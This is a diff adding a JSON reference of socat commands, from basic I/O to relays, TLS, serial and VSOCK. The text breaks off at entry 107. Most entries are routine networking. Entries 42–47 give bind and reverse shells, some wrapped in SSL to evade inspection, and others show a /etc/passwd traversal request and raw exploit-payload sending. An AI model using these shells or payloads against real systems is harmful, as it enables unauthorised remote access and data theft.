@@ -1,0 +1,1057 @@
+{
+    "tool": "socat",
+    "description": "Complete socat command and workflow reference from basic to advanced socket and data relay operations",
+    "total_commands": 150,
+    "commands": [
+        {
+            "id": 1,
+            "category": "Basic Syntax & Help",
+            "command": "socat -h",
+            "example": "socat -h",
+            "explanation": "Displays the basic help summary and command line options."
+        },
+        {
+            "id": 2,
+            "category": "Basic Syntax & Help",
+            "command": "socat -V",
+            "example": "socat -V",
+            "explanation": "Prints version information and supported features/protocols."
+        },
+        {
+            "id": 3,
+            "category": "Basic STDIO",
+            "command": "socat - -",
+            "example": "socat - -",
+            "explanation": "Pipes standard input directly to standard output, acting as a simple echo."
+        },
+        {
+            "id": 4,
+            "category": "Basic File Operations",
+            "command": "socat - /tmp/testfile.txt",
+            "example": "echo 'hello' | socat - /tmp/testfile.txt",
+            "explanation": "Writes data received from standard input to a specified file."
+        },
+        {
+            "id": 5,
+            "category": "Basic File Operations",
+            "command": "socat /tmp/testfile.txt -",
+            "example": "socat /tmp/testfile.txt -",
+            "explanation": "Reads data from a specified file and outputs it to standard output."
+        },
+        {
+            "id": 6,
+            "category": "Basic TCP Client",
+            "command": "socat - TCP:127.0.0.1:80",
+            "example": "socat - TCP:127.0.0.1:80",
+            "explanation": "Connects to a local TCP port 80 and sends stdin/receives stdout."
+        },
+        {
+            "id": 7,
+            "category": "Basic TCP Server",
+            "command": "socat TCP-LISTEN:8080 STDOUT",
+            "example": "socat TCP-LISTEN:8080 STDOUT",
+            "explanation": "Listens on TCP port 8080 and prints incoming data to stdout (single connection)."
+        },
+        {
+            "id": 8,
+            "category": "Basic UDP Client",
+            "command": "socat - UDP:127.0.0.1:53",
+            "example": "socat - UDP:127.0.0.1:53",
+            "explanation": "Sends data from stdin to a UDP socket on port 53."
+        },
+        {
+            "id": 9,
+            "category": "Basic UDP Server",
+            "command": "socat UDP-LISTEN:5353 STDOUT",
+            "example": "socat UDP-LISTEN:5353 STDOUT",
+            "explanation": "Listens for UDP packets on port 5353 and prints them to stdout."
+        },
+        {
+            "id": 10,
+            "category": "TCP Server (Persistent)",
+            "command": "socat TCP-LISTEN:8080,fork STDOUT",
+            "example": "socat TCP-LISTEN:8080,fork STDOUT",
+            "explanation": "Listens on port 8080 and forks a new process for each connection to handle multiple clients."
+        },
+        {
+            "id": 11,
+            "category": "TCP Server (Reuse Address)",
+            "command": "socat TCP-LISTEN:8080,reuseaddr STDOUT",
+            "example": "socat TCP-LISTEN:8080,reuseaddr STDOUT",
+            "explanation": "Listens on port 8080 and allows immediate reuse of the port after termination."
+        },
+        {
+            "id": 12,
+            "category": "Port Forwarding (TCP)",
+            "command": "socat TCP-LISTEN:8080,fork TCP:192.168.1.50:80",
+            "example": "socat TCP-LISTEN:8080,fork TCP:192.168.1.50:80",
+            "explanation": "Forwards all incoming traffic on local port 8080 to remote IP 192.168.1.50 on port 80."
+        },
+        {
+            "id": 13,
+            "category": "Port Forwarding (UDP)",
+            "command": "socat UDP-LISTEN:5353,fork UDP:192.168.1.50:53",
+            "example": "socat UDP-LISTEN:5353,fork UDP:192.168.1.50:53",
+            "explanation": "Forwards all incoming UDP traffic on local port 5353 to remote IP 192.168.1.50 on port 53."
+        },
+        {
+            "id": 14,
+            "category": "Local Port Binding",
+            "command": "socat TCP:192.168.1.50:80,bind=192.168.1.10 -",
+            "example": "socat TCP:192.168.1.50:80,bind=192.168.1.10 -",
+            "explanation": "Connects to a remote server while binding the source traffic to a specific local interface IP."
+        },
+        {
+            "id": 15,
+            "category": "Source Port Binding",
+            "command": "socat TCP:192.168.1.50:80,sp=31337 -",
+            "example": "socat TCP:192.168.1.50:80,sp=31337 -",
+            "explanation": "Connects to a remote server forcing the source port to be 31337."
+        },
+        {
+            "id": 16,
+            "category": "Unix Domain Socket Listen",
+            "command": "socat UNIX-LISTEN:/tmp/mysocket -",
+            "example": "socat UNIX-LISTEN:/tmp/mysocket -",
+            "explanation": "Creates a Unix domain socket at /tmp/mysocket and listens for connections."
+        },
+        {
+            "id": 17,
+            "category": "Unix Domain Socket Connect",
+            "command": "socat - UNIX-CONNECT:/tmp/mysocket",
+            "example": "socat - UNIX-CONNECT:/tmp/mysocket",
+            "explanation": "Connects to an existing Unix domain socket at /tmp/mysocket."
+        },
+        {
+            "id": 18,
+            "category": "Unix Datagram Listen",
+            "command": "socat UNIX-RECVFROM:/tmp/udgram.sock -",
+            "example": "socat UNIX-RECVFROM:/tmp/udgram.sock -",
+            "explanation": "Creates a Unix datagram socket and receives packets."
+        },
+        {
+            "id": 19,
+            "category": "Unix Datagram Send",
+            "command": "socat - UNIX-SENDTO:/tmp/udgram.sock",
+            "example": "socat - UNIX-SENDTO:/tmp/udgram.sock",
+            "explanation": "Sends data from stdin to a Unix datagram socket."
+        },
+        {
+            "id": 20,
+            "category": "IPv6 TCP Client",
+            "command": "socat - TCP6:[::1]:80",
+            "example": "socat - TCP6:[::1]:80",
+            "explanation": "Connects to an IPv6 localhost address on TCP port 80."
+        },
+        {
+            "id": 21,
+            "category": "IPv6 TCP Server",
+            "command": "socat TCP6-LISTEN:8080 STDOUT",
+            "example": "socat TCP6-LISTEN:8080 STDOUT",
+            "explanation": "Listens on IPv6 port 8080 and prints output to stdout."
+        },
+        {
+            "id": 22,
+            "category": "Protocol Bridging (IPv4 to IPv6)",
+            "command": "socat TCP4-LISTEN:8080,fork TCP6:[::1]:80",
+            "example": "socat TCP4-LISTEN:8080,fork TCP6:[::1]:80",
+            "explanation": "Listens on IPv4 port 8080 and forwards traffic to an IPv6 address."
+        },
+        {
+            "id": 23,
+            "category": "Protocol Bridging (TCP to Unix)",
+            "command": "socat TCP-LISTEN:8080,fork UNIX-CONNECT:/tmp/app.sock",
+            "example": "socat TCP-LISTEN:8080,fork UNIX-CONNECT:/tmp/app.sock",
+            "explanation": "Exposes a local Unix domain socket over a TCP port."
+        },
+        {
+            "id": 24,
+            "category": "File Transfer (Receiver)",
+            "command": "socat TCP-LISTEN:9999,fork FILE:received_file.txt,create",
+            "example": "socat TCP-LISTEN:9999,fork FILE:received_file.txt,create",
+            "explanation": "Listens on port 9999 and writes incoming data to a new file."
+        },
+        {
+            "id": 25,
+            "category": "File Transfer (Sender)",
+            "command": "socat FILE:source_file.txt TCP:192.168.1.50:9999",
+            "example": "socat FILE:source_file.txt TCP:192.168.1.50:9999",
+            "explanation": "Reads a file and sends its content to a remote TCP port."
+        },
+        {
+            "id": 26,
+            "category": "Execution (Simple)",
+            "command": "socat - EXEC:/bin/date",
+            "example": "socat - EXEC:/bin/date",
+            "explanation": "Executes the date command and prints the output to stdout."
+        },
+        {
+            "id": 27,
+            "category": "Execution (Network)",
+            "command": "socat TCP-LISTEN:8080,fork EXEC:/bin/cat",
+            "example": "socat TCP-LISTEN:8080,fork EXEC:/bin/cat",
+            "explanation": "Listens on port 8080 and executes 'cat' for every connection, acting as an echo server."
+        },
+        {
+            "id": 28,
+            "category": "System Execution",
+            "command": "socat - SYSTEM:'ls -la'",
+            "example": "socat - SYSTEM:'ls -la'",
+            "explanation": "Uses the system() call to execute a shell command line string."
+        },
+        {
+            "id": 29,
+            "category": "SSL Client (Unverified)",
+            "command": "socat - OPENSSL:192.168.1.50:443,verify=0",
+            "example": "socat - OPENSSL:192.168.1.50:443,verify=0",
+            "explanation": "Connects to an SSL/TLS service without verifying the server certificate."
+        },
+        {
+            "id": 30,
+            "category": "SSL Server (Self-Signed)",
+            "command": "socat OPENSSL-LISTEN:4443,cert=server.pem,key=server.key,verify=0 STDOUT",
+            "example": "socat OPENSSL-LISTEN:4443,cert=server.pem,key=server.key,verify=0 STDOUT",
+            "explanation": "Listens for SSL connections using a specified certificate and key file."
+        },
+        {
+            "id": 31,
+            "category": "SSL Client (Verified)",
+            "command": "socat - OPENSSL:example.com:443,cafile=ca.pem",
+            "example": "socat - OPENSSL:example.com:443,cafile=ca.pem",
+            "explanation": "Connects to an SSL service and verifies trust using a specific CA file."
+        },
+        {
+            "id": 32,
+            "category": "SSL Server (Require Client Cert)",
+            "command": "socat OPENSSL-LISTEN:4443,cert=server.pem,verify=1,cafile=client_ca.pem -",
+            "example": "socat OPENSSL-LISTEN:4443,cert=server.pem,verify=1,cafile=client_ca.pem -",
+            "explanation": "Listens for SSL connections and mandates a valid client certificate."
+        },
+        {
+            "id": 33,
+            "category": "Proxy Connect (HTTP)",
+            "command": "socat - PROXY:10.0.0.1:target.com:80,proxyport=3128",
+            "example": "socat - PROXY:10.0.0.1:target.com:80,proxyport=3128",
+            "explanation": "Connects to target.com via an HTTP proxy at 10.0.0.1:3128."
+        },
+        {
+            "id": 34,
+            "category": "Proxy Connect (SOCKS4)",
+            "command": "socat - SOCKS4:127.0.0.1:target.com:80,socksuser=nobody",
+            "example": "socat - SOCKS4:127.0.0.1:target.com:80,socksuser=nobody",
+            "explanation": "Connects to target.com via a local SOCKS4 proxy."
+        },
+        {
+            "id": 35,
+            "category": "Proxy Connect (SOCKS5)",
+            "command": "socat - SOCKS5:127.0.0.1:target.com:80",
+            "example": "socat - SOCKS5:127.0.0.1:target.com:80",
+            "explanation": "Connects to target.com via a local SOCKS5 proxy."
+        },
+        {
+            "id": 36,
+            "category": "Virtual Serial Port",
+            "command": "socat PTY,link=/tmp/ttyV0 PTY,link=/tmp/ttyV1",
+            "example": "socat PTY,link=/tmp/ttyV0 PTY,link=/tmp/ttyV1",
+            "explanation": "Creates two connected pseudo-terminals to simulate a serial null-modem cable."
+        },
+        {
+            "id": 37,
+            "category": "Serial to TCP",
+            "command": "socat /dev/ttyS0,raw,echo=0 TCP:192.168.1.50:9000",
+            "example": "socat /dev/ttyS0,raw,echo=0 TCP:192.168.1.50:9000",
+            "explanation": "Bridges a physical serial port to a TCP connection."
+        },
+        {
+            "id": 38,
+            "category": "Command Line History (Readline)",
+            "command": "socat READLINE TCP:127.0.0.1:80",
+            "example": "socat READLINE TCP:127.0.0.1:80",
+            "explanation": "Wraps the connection in readline to allow line editing and history on the client side."
+        },
+        {
+            "id": 39,
+            "category": "Logging (Verbose)",
+            "command": "socat -d -d TCP-LISTEN:8080 STDOUT",
+            "example": "socat -d -d TCP-LISTEN:8080 STDOUT",
+            "explanation": "Runs socat with increased verbosity to show connection lifecycle events."
+        },
+        {
+            "id": 40,
+            "category": "Logging (File)",
+            "command": "socat -lf /tmp/socat.log TCP-LISTEN:8080 STDOUT",
+            "example": "socat -lf /tmp/socat.log TCP-LISTEN:8080 STDOUT",
+            "explanation": "Redirects socat internal log messages to a specified file."
+        },
+        {
+            "id": 41,
+            "category": "Data Dump (Hex)",
+            "command": "socat -x TCP-LISTEN:8080 STDOUT",
+            "example": "socat -x TCP-LISTEN:8080 STDOUT",
+            "explanation": "Prints all traffic passing through the connection in hexadecimal format to stderr."
+        },
+        {
+            "id": 42,
+            "category": "Bind Shell (Basic)",
+            "command": "socat TCP-LISTEN:4444,fork EXEC:/bin/bash",
+            "example": "socat TCP-LISTEN:4444,fork EXEC:/bin/bash",
+            "explanation": "Exposes a bash shell on port 4444 (Unsecure: No TTY)."
+        },
+        {
+            "id": 43,
+            "category": "Reverse Shell (Basic)",
+            "command": "socat TCP:192.168.1.5:4444 EXEC:/bin/bash",
+            "example": "socat TCP:192.168.1.5:4444 EXEC:/bin/bash",
+            "explanation": "Connects to a listener on 192.168.1.5 and provides a bash shell."
+        },
+        {
+            "id": 44,
+            "category": "Bind Shell (TTY)",
+            "command": "socat TCP-LISTEN:4444,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
+            "example": "socat TCP-LISTEN:4444,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
+            "explanation": "Exposes a fully interactive TTY shell on port 4444 handling signals correctly."
+        },
+        {
+            "id": 45,
+            "category": "Reverse Shell (TTY)",
+            "command": "socat TCP:192.168.1.5:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
+            "example": "socat TCP:192.168.1.5:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
+            "explanation": "Connects back to an attacker and provides a fully interactive TTY shell."
+        },
+        {
+            "id": 46,
+            "category": "Encrypted Bind Shell",
+            "command": "socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,fork EXEC:/bin/bash",
+            "example": "socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,fork EXEC:/bin/bash",
+            "explanation": "Exposes a bash shell wrapped in SSL encryption to evade basic packet inspection."
+        },
+        {
+            "id": 47,
+            "category": "Encrypted Reverse Shell",
+            "command": "socat OPENSSL:192.168.1.5:4444,verify=0 EXEC:/bin/bash",
+            "example": "socat OPENSSL:192.168.1.5:4444,verify=0 EXEC:/bin/bash",
+            "explanation": "Connects back to an SSL listener and provides a shell."
+        },
+        {
+            "id": 48,
+            "category": "Datagram Forwarding (UDP to TCP)",
+            "command": "socat UDP-LISTEN:514,fork TCP:192.168.1.50:514",
+            "example": "socat UDP-LISTEN:514,fork TCP:192.168.1.50:514",
+            "explanation": "Converts UDP Syslog traffic to TCP for reliable transport."
+        },
+        {
+            "id": 49,
+            "category": "Abstract Namespace (Linux)",
+            "command": "socat ABSTRACT-LISTEN:mysocket -",
+            "example": "socat ABSTRACT-LISTEN:mysocket -",
+            "explanation": "Listens on a Linux abstract namespace socket (no filesystem presence)."
+        },
+        {
+            "id": 50,
+            "category": "Abstract Namespace Connect",
+            "command": "socat - ABSTRACT-CONNECT:mysocket",
+            "example": "socat - ABSTRACT-CONNECT:mysocket",
+            "explanation": "Connects to a Linux abstract namespace socket."
+        },
+        {
+            "id": 51,
+            "category": "Multicast Receive",
+            "command": "socat UDP4-RECVFROM:8888,ip-add-membership=224.0.0.1:0.0.0.0 -",
+            "example": "socat UDP4-RECVFROM:8888,ip-add-membership=224.0.0.1:0.0.0.0 -",
+            "explanation": "Joins a multicast group 224.0.0.1 and receives packets on port 8888."
+        },
+        {
+            "id": 52,
+            "category": "Multicast Send",
+            "command": "socat - UDP4-DATAGRAM:224.0.0.1:8888",
+            "example": "socat - UDP4-DATAGRAM:224.0.0.1:8888",
+            "explanation": "Sends UDP datagrams to a multicast address."
+        },
+        {
+            "id": 53,
+            "category": "Broadcast Send",
+            "command": "socat - UDP4-DATAGRAM:192.168.1.255:9999,broadcast",
+            "example": "socat - UDP4-DATAGRAM:192.168.1.255:9999,broadcast",
+            "explanation": "Sends UDP packets to the broadcast address of the subnet."
+        },
+        {
+            "id": 54,
+            "category": "Broadcast Receive",
+            "command": "socat UDP4-RECVFROM:9999,broadcast -",
+            "example": "socat UDP4-RECVFROM:9999,broadcast -",
+            "explanation": "Receives broadcast UDP packets on port 9999."
+        },
+        {
+            "id": 55,
+            "category": "TCP Wrapper",
+            "command": "socat TCP-LISTEN:8080,fork,tcpwrap=httpd STDOUT",
+            "example": "socat TCP-LISTEN:8080,fork,tcpwrap=httpd STDOUT",
+            "explanation": "Listens on port 8080 and checks /etc/hosts.allow/deny using the 'httpd' service name."
+        },
+        {
+            "id": 56,
+            "category": "Range Restriction",
+            "command": "socat TCP-LISTEN:8080,fork,range=192.168.1.0/24 STDOUT",
+            "example": "socat TCP-LISTEN:8080,fork,range=192.168.1.0/24 STDOUT",
+            "explanation": "Accepts connections only from IP addresses within the 192.168.1.0/24 subnet."
+        },
+        {
+            "id": 57,
+            "category": "User Impersonation (Su)",
+            "command": "socat TCP-LISTEN:8080,su=nobody STDOUT",
+            "example": "socat TCP-LISTEN:8080,su=nobody STDOUT",
+            "explanation": "Starts as root to bind port 8080, then drops privileges to user 'nobody'."
+        },
+        {
+            "id": 58,
+            "category": "Chroot Jail",
+            "command": "socat TCP-LISTEN:8080,chroot=/var/tmp/jail STDOUT",
+            "example": "socat TCP-LISTEN:8080,chroot=/var/tmp/jail STDOUT",
+            "explanation": "Restricts the socat process to a specific directory (chroot) after connection."
+        },
+        {
+            "id": 59,
+            "category": "Connection Timeout",
+            "command": "socat - TCP:192.168.1.50:80,connect-timeout=5",
+            "example": "socat - TCP:192.168.1.50:80,connect-timeout=5",
+            "explanation": "Aborts the connection attempt if the server does not respond within 5 seconds."
+        },
+        {
+            "id": 60,
+            "category": "Read Timeout",
+            "command": "socat - TCP:192.168.1.50:80,read-timeout=10",
+            "example": "socat - TCP:192.168.1.50:80,read-timeout=10",
+            "explanation": "Closes the connection if no data is received for 10 seconds."
+        },
+        {
+            "id": 61,
+            "category": "Total Timeout",
+            "command": "socat -t 20 TCP:192.168.1.50:80 -",
+            "example": "socat -t 20 TCP:192.168.1.50:80 -",
+            "explanation": "Terminates the process after 20 seconds of inactivity when one side closes."
+        },
+        {
+            "id": 62,
+            "category": "Keepalive Tuning",
+            "command": "socat - TCP:192.168.1.50:80,keepalive,keepidle=60,keepintvl=10,keepcnt=3",
+            "example": "socat - TCP:192.168.1.50:80,keepalive,keepidle=60,keepintvl=10,keepcnt=3",
+            "explanation": "Enables TCP keepalives with custom idle time, interval, and failure count."
+        },
+        {
+            "id": 63,
+            "category": "Traffic Shaping (MSS)",
+            "command": "socat - TCP:192.168.1.50:80,mss=512",
+            "example": "socat - TCP:192.168.1.50:80,mss=512",
+            "explanation": "Forces the Maximum Segment Size to 512 bytes for testing fragmentation or MTU issues."
+        },
+        {
+            "id": 64,
+            "category": "Traffic Shaping (TTL)",
+            "command": "socat - TCP:192.168.1.50:80,ttl=1",
+            "example": "socat - TCP:192.168.1.50:80,ttl=1",
+            "explanation": "Sets the IP Time To Live to 1, useful for testing network hops."
+        },
+        {
+            "id": 65,
+            "category": "Pipe Integration",
+            "command": "socat PIPE:/tmp/mypipe -",
+            "example": "socat PIPE:/tmp/mypipe -",
+            "explanation": "Reads from an existing named pipe."
+        },
+        {
+            "id": 66,
+            "category": "Open File by Descriptor",
+            "command": "socat FD:3 -",
+            "example": "socat FD:3 -",
+            "explanation": "Reads/Writes to file descriptor 3 (useful in shell scripts)."
+        },
+        {
+            "id": 67,
+            "category": "Quiet Mode",
+            "command": "socat -u TCP:192.168.1.50:80 -",
+            "example": "socat -u TCP:192.168.1.50:80 -",
+            "explanation": "Unidirectional mode (left to right only), ignoring reverse traffic."
+        },
+        {
+            "id": 68,
+            "category": "Reverse Unidirectional",
+            "command": "socat -U TCP:192.168.1.50:80 -",
+            "example": "socat -U TCP:192.168.1.50:80 -",
+            "explanation": "Unidirectional mode (right to left only), useful for download-only streams."
+        },
+        {
+            "id": 69,
+            "category": "Ignore EOF",
+            "command": "socat -u FILE:data.txt,ignoreeof TCP:192.168.1.50:9000",
+            "example": "socat -u FILE:data.txt,ignoreeof TCP:192.168.1.50:9000",
+            "explanation": "Keeps the socket open even after the input file has been fully read."
+        },
+        {
+            "id": 70,
+            "category": "Web Server (Static Response)",
+            "command": "socat TCP-LISTEN:8080,fork SYSTEM:'echo HTTP/1.0 200; echo Content-Type: text/plain; echo; echo Hello'",
+            "example": "socat TCP-LISTEN:8080,fork SYSTEM:'echo HTTP/1.0 200; echo Content-Type: text/plain; echo; echo Hello'",
+            "explanation": "A crude HTTP server that returns a static hello message to every visitor."
+        },
+        {
+            "id": 71,
+            "category": "Web Server (File Serve)",
+            "command": "socat TCP-LISTEN:8080,fork SYSTEM:'cat header.txt index.html'",
+            "example": "socat TCP-LISTEN:8080,fork SYSTEM:'cat header.txt index.html'",
+            "explanation": "Serves a specific HTML file with headers upon connection."
+        },
+        {
+            "id": 72,
+            "category": "HTTP Proxy (Man-in-the-Middle)",
+            "command": "socat -v TCP-LISTEN:8080,fork TCP:target.com:80",
+            "example": "socat -v TCP-LISTEN:8080,fork TCP:target.com:80",
+            "explanation": "Forwards traffic to target.com and logs HTTP headers to stderr."
+        },
+        {
+            "id": 73,
+            "category": "Raw Socket Send",
+            "command": "socat - RAW:192.168.1.50:255",
+            "example": "socat - RAW:192.168.1.50:255",
+            "explanation": "Sends raw IP packets (protocol 255) to a destination."
+        },
+        {
+            "id": 74,
+            "category": "Interface Binding",
+            "command": "socat - UDP:192.168.1.50:53,bindtodevice=eth0",
+            "example": "socat - UDP:192.168.1.50:53,bindtodevice=eth0",
+            "explanation": "Forces the traffic to exit through a specific network interface (eth0)."
+        },
+        {
+            "id": 75,
+            "category": "TUN Interface Creation",
+            "command": "socat TUN:10.0.0.1/24,tun-type=tun,tun-name=mytun0 -",
+            "example": "socat TUN:10.0.0.1/24,tun-type=tun,tun-name=mytun0 -",
+            "explanation": "Creates a virtual TUN interface with IP 10.0.0.1 (requires root)."
+        },
+        {
+            "id": 76,
+            "category": "TAP Interface Creation",
+            "command": "socat TUN:10.0.0.1/24,tun-type=tap,tun-name=mytap0 -",
+            "example": "socat TUN:10.0.0.1/24,tun-type=tap,tun-name=mytap0 -",
+            "explanation": "Creates a virtual TAP (Ethernet) interface."
+        },
+        {
+            "id": 77,
+            "category": "SCTP Client",
+            "command": "socat - SCTP:192.168.1.50:80",
+            "example": "socat - SCTP:192.168.1.50:80",
+            "explanation": "Connects to a remote SCTP service."
+        },
+        {
+            "id": 78,
+            "category": "SCTP Server",
+            "command": "socat SCTP-LISTEN:8080,fork STDOUT",
+            "example": "socat SCTP-LISTEN:8080,fork STDOUT",
+            "explanation": "Listens for incoming SCTP connections."
+        },
+        {
+            "id": 79,
+            "category": "OpenSSL Certificate Gen (Context)",
+            "command": "openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key",
+            "example": "openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key",
+            "explanation": "Prerequisite command to generate certificate/key pairs for socat SSL listeners."
+        },
+        {
+            "id": 80,
+            "category": "SSL Fingerprinting",
+            "command": "socat -v OPENSSL:192.168.1.50:443,verify=0 /dev/null",
+            "example": "socat -v OPENSSL:192.168.1.50:443,verify=0 /dev/null",
+            "explanation": "Connects via SSL and dumps verbose handshake info to stderr to inspect headers."
+        },
+        {
+            "id": 81,
+            "category": "DTLS Client (UDP SSL)",
+            "command": "socat - OPENSSL-DTLS-CLIENT:192.168.1.50:4433,verify=0",
+            "example": "socat - OPENSSL-DTLS-CLIENT:192.168.1.50:4433,verify=0",
+            "explanation": "Connects to a Datagram TLS (UDP encrypted) service."
+        },
+        {
+            "id": 82,
+            "category": "DTLS Server (UDP SSL)",
+            "command": "socat OPENSSL-DTLS-SERVER:4433,cert=server.pem,key=server.key,verify=0 STDOUT",
+            "example": "socat OPENSSL-DTLS-SERVER:4433,cert=server.pem,key=server.key,verify=0 STDOUT",
+            "explanation": "Listens for DTLS connections."
+        },
+        {
+            "id": 83,
+            "category": "File Descriptor Passing",
+            "command": "socat UNIX-LISTEN:/tmp/pass.sock,fork EXEC:'/bin/cat',fdin=3,fdout=4",
+            "example": "socat UNIX-LISTEN:/tmp/pass.sock,fork EXEC:'/bin/cat',fdin=3,fdout=4",
+            "explanation": "Advanced usage for passing specific file descriptors to the executed process."
+        },
+        {
+            "id": 84,
+            "category": "GOPEN (Generic Open)",
+            "command": "socat - GOPEN:/tmp/testfile.txt",
+            "example": "socat - GOPEN:/tmp/testfile.txt",
+            "explanation": "Opens a file using generic open flags, useful for non-standard file types."
+        },
+        {
+            "id": 85,
+            "category": "Directory Traversal Test",
+            "command": "socat - TCP:192.168.1.50:80,crlf",
+            "example": "echo -e 'GET /../../etc/passwd HTTP/1.0\\n\\n' | socat - TCP:192.168.1.50:80,crlf",
+            "explanation": "Sends payloads with forced CRLF line endings to test web servers."
+        },
+        {
+            "id": 86,
+            "category": "SMTP Interaction",
+            "command": "socat - TCP:192.168.1.50:25,crlf",
+            "example": "socat - TCP:192.168.1.50:25,crlf",
+            "explanation": "Connects to an SMTP server, automatically converting local LF to network CRLF."
+        },
+        {
+            "id": 87,
+            "category": "Banner Grabbing",
+            "command": "socat - OPENSSL:192.168.1.50:443,verify=0,connect-timeout=2",
+            "example": "socat - OPENSSL:192.168.1.50:443,verify=0,connect-timeout=2",
+            "explanation": "Quickly connects to an SSL port to grab the service banner and disconnect."
+        },
+        {
+            "id": 88,
+            "category": "VM Socket (VSOCK) Connect",
+            "command": "socat - VSOCK-CONNECT:2:1234",
+            "example": "socat - VSOCK-CONNECT:2:1234",
+            "explanation": "Connects to a VSOCK (Virtual Machine socket) CID 2 port 1234."
+        },
+        {
+            "id": 89,
+            "category": "VM Socket (VSOCK) Listen",
+            "command": "socat VSOCK-LISTEN:1234 STDOUT",
+            "example": "socat VSOCK-LISTEN:1234 STDOUT",
+            "explanation": "Listens for VSOCK connections on port 1234."
+        },
+        {
+            "id": 90,
+            "category": "Disable Nagle Algorithm",
+            "command": "socat - TCP:192.168.1.50:80,nodelay",
+            "example": "socat - TCP:192.168.1.50:80,nodelay",
+            "explanation": "Disables Nagle's algorithm (TCP_NODELAY) for lower latency on small packets."
+        },
+        {
+            "id": 91,
+            "category": "Broadcast Relay",
+            "command": "socat UDP4-RECVFROM:9999,broadcast,fork UDP4-DATAGRAM:192.168.2.255:9999,broadcast",
+            "example": "socat UDP4-RECVFROM:9999,broadcast,fork UDP4-DATAGRAM:192.168.2.255:9999,broadcast",
+            "explanation": "Relays broadcast traffic from one subnet to another."
+        },
+        {
+            "id": 92,
+            "category": "Git Protocol Wrapper",
+            "command": "socat TCP-LISTEN:9418,fork EXEC:'git daemon --inetd --verbose --base-path=/tmp/repo'",
+            "example": "socat TCP-LISTEN:9418,fork EXEC:'git daemon --inetd --verbose --base-path=/tmp/repo'",
+            "explanation": "Exposes a local git repository via the Git protocol."
+        },
+        {
+            "id": 93,
+            "category": "Rsync Wrapper",
+            "command": "socat TCP-LISTEN:873,fork EXEC:'rsync --daemon --no-detach'",
+            "example": "socat TCP-LISTEN:873,fork EXEC:'rsync --daemon --no-detach'",
+            "explanation": "Wraps the rsync daemon in a socat listener."
+        },
+        {
+            "id": 94,
+            "category": "Port Knocking Simulation",
+            "command": "socat - UDP:192.168.1.1:7000; socat - UDP:192.168.1.1:8000",
+            "example": "socat - UDP:192.168.1.1:7000; socat - UDP:192.168.1.1:8000",
+            "explanation": "Sends a sequence of packets to specific ports to trigger a knock sequence."
+        },
+        {
+            "id": 95,
+            "category": "Payload Injection (File)",
+            "command": "socat TCP:192.168.1.50:80 FILE:exploit.bin",
+            "example": "socat TCP:192.168.1.50:80 FILE:exploit.bin",
+            "explanation": "Sends the raw binary content of a file directly to a target service."
+        },
+        {
+            "id": 96,
+            "category": "Loopback Relay",
+            "command": "socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80",
+            "example": "socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80",
+            "explanation": "Exposes a service bound to localhost only (127.0.0.1) to the external network interface."
+        },
+        {
+            "id": 97,
+            "category": "Unix to TCP Bridge",
+            "command": "socat UNIX-LISTEN:/tmp/docker.sock,fork TCP:192.168.1.50:2375",
+            "example": "socat UNIX-LISTEN:/tmp/docker.sock,fork TCP:192.168.1.50:2375",
+            "explanation": "Maps a local Docker Unix socket to a remote TCP Docker daemon."
+        },
+        {
+            "id": 98,
+            "category": "TCP to Unix Bridge",
+            "command": "socat TCP-LISTEN:2375,fork UNIX-CONNECT:/var/run/docker.sock",
+            "example": "socat TCP-LISTEN:2375,fork UNIX-CONNECT:/var/run/docker.sock",
+            "explanation": "Exposes the local Docker Unix socket over TCP (Security risk: use with caution)."
+        },
+        {
+            "id": 99,
+            "category": "Encrypted Forwarder",
+            "command": "socat TCP-LISTEN:8080,fork OPENSSL:example.com:443,verify=0",
+            "example": "socat TCP-LISTEN:8080,fork OPENSSL:example.com:443,verify=0",
+            "explanation": "Creates a local plaintext listener that encrypts traffic to a remote SSL server."
+        },
+        {
+            "id": 100,
+            "category": "Decrypted Forwarder",
+            "command": "socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:127.0.0.1:80",
+            "example": "socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:127.0.0.1:80",
+            "explanation": "Offloads SSL encryption, forwarding decrypted traffic to a local HTTP server."
+        },
+        {
+            "id": 101,
+            "category": "IPv6 Tunnelling over IPv4",
+            "command": "socat TCP4-LISTEN:8080,fork TCP6:[2001:db8::1]:80",
+            "example": "socat TCP4-LISTEN:8080,fork TCP6:[2001:db8::1]:80",
+            "explanation": "Bridges IPv4 network traffic to an internal IPv6-only host."
+        },
+        {
+            "id": 102,
+            "category": "Multiple Listeners",
+            "command": "socat TCP-LISTEN:8080,fork TCP-LISTEN:8081,fork",
+            "example": "socat TCP-LISTEN:8080,fork TCP-LISTEN:8081,fork",
+            "explanation": "Bridges two different listening ports together, connecting clients from port A to clients on port B."
+        },
+        {
+            "id": 103,
+            "category": "Log Timestamping",
+            "command": "socat -lf /tmp/log.txt -d -d TCP-LISTEN:8080 STDOUT",
+            "example": "socat -lf /tmp/log.txt -d -d TCP-LISTEN:8080 STDOUT",
+            "explanation": "Logs connections with timestamps to a file for auditing."
+        },
+        {
+            "id": 104,
+            "category": "Read-Only File System Mount",
+            "command": "socat UNIX-LISTEN:/tmp/readonly.sock,fork EXEC:'ls -la',readonly",
+            "example": "socat UNIX-LISTEN:/tmp/readonly.sock,fork EXEC:'ls -la',readonly",
+            "explanation": "Executes a command but prevents it from writing data back to the socket."
+        },
+        {
+            "id": 105,
+            "category": "Write-Only Socket",
+            "command": "socat -u - TCP:192.168.1.50:9000",
+            "example": "socat -u - TCP:192.168.1.50:9000",
+            "explanation": "Enforces a strict write-only channel to the destination."
+        },
+        {
+            "id": 106,
+            "category": "Maximum Children Limit",
+            "command": "socat TCP-LISTEN:8080,fork,max-children=5 STDOUT",
+            "example": "socat TCP-LISTEN:8080,fork,max-children=5 STDOUT",
+            "explanation": "Limits the concurrent connections to 5 to prevent resource exhaustion."
+        },
+        {
+            "id": 107,
+            "category": "Backlog Queue Tuning",
+            "command": "socat TCP-LISTEN:8080,backlog=128 STDOUT",
